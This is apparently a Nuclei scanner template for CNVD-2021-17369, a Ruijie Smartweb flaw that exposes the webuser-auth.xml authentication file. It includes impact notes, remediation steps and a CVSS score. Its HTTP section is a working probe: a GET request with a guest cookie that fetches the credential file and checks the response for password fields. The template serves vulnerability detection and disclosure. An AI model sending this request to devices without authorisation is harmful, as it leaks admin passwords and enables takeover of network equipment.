id: CNVD-2021-17369

info:
  name: 锐捷 Smartweb 管理系统密码信息泄露漏洞（CNVD-2021-17369）
  author: pikpikcu
  severity: high
  description: |
    锐捷 Smartweb 管理系统暴露 `webuser-auth.xml` 配置文件，攻击者可直接读取用户认证信息。模板请求 `/web/xml/webuser-auth.xml`，并匹配 `userauth` 与 `password` 字段确认漏洞。
  impact: |
    - 攻击者可获取管理用户密码或密码摘要，尝试登录设备后台。
    - 网络设备后台被控制后，可能导致访问策略、路由配置和安全边界被篡改。
  remediation: |
    - 升级锐捷 Smartweb 固件，修复配置文件直接暴露问题。
    - 禁止 Web 目录直接提供认证配置文件下载，管理接口仅允许可信网段访问。
    - 轮换所有设备管理账号密码，并检查配置变更和异常登录记录。
  reference:
    - https://www.cnvd.org.cn/flaw/show/CNVD-2021-17369
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    max-request: 1
  tags: cnvd2021,cnvd,ruijie,disclosure,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/web/xml/webuser-auth.xml"

    headers:
      Cookie: login=1; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<userauth>"
          - "<password>"
        condition: and

      - type: status
        status:
          - 200
